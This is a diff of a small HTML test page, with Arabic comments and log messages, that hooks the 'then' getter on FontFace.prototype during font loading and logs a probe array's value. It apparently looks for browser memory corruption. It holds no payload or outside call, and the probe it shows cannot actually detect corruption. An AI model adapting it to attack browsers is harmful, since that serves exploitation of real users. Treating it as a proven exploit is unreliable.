@@ -1,35 +1,27 @@
 <!DOCTYPE html>
 <html>
-<body style="background:#000; color:#0f0; font-family:monospace; padding:10px;">
-    <div id="log">بدء فحص الذاكرة...</div>
+<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
+    <div id="log" style="font-size: 1.2em;"></div>
     <script>
         function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }
 
-        // إنشاء كائن واجهة (Victim Object)
         let A = new FontFace('x', 'local(Arial)', {});
         document.fonts.add(A);
-
-        // إنشاء مصفوفة لمقارنة قيم الذاكرة
+        
         let probe = new Uint32Array(0x100);
-        probe.fill(0x12345678);
+        probe[0] = 0x12345678;
 
-        // اعتراض محاولة الوصول للذاكرة
         Object.defineProperty(FontFace.prototype, 'then', {
+            configurable: true,
             get() {
-                log("TRAP HIT: تم اعتراض الوصول!");
-                // هنا نختبر هل تغيرت قيم الذاكرة في المصفوفة الخاصة بنا؟
-                if (probe[0] !== 0x12345678) {
-                    log("نجاح: تم رصد فساد في الذاكرة! القيمة الحالية: " + probe[0].toString(16));
-                } else {
-                    log("الذاكرة لا تزال سليمة - لم يحدث Corruption.");
-                }
+                // طباعة القيمة الحالية للمصفوفة فور الوصول للفخ
+                log("تم اعتراض الوصول! قيمة المصفوفة الحالية هي: " + probe[0].toString(16));
                 return undefined;
             }
         });
 
-        // تشغيل التحميل
         log("بدء التحميل...");
-        document.fonts.load('1em x', 'AB').catch(() => log("تم رفض التحميل."));
+        document.fonts.load('1em x', 'AB');
     </script>
 </body>
 </html>
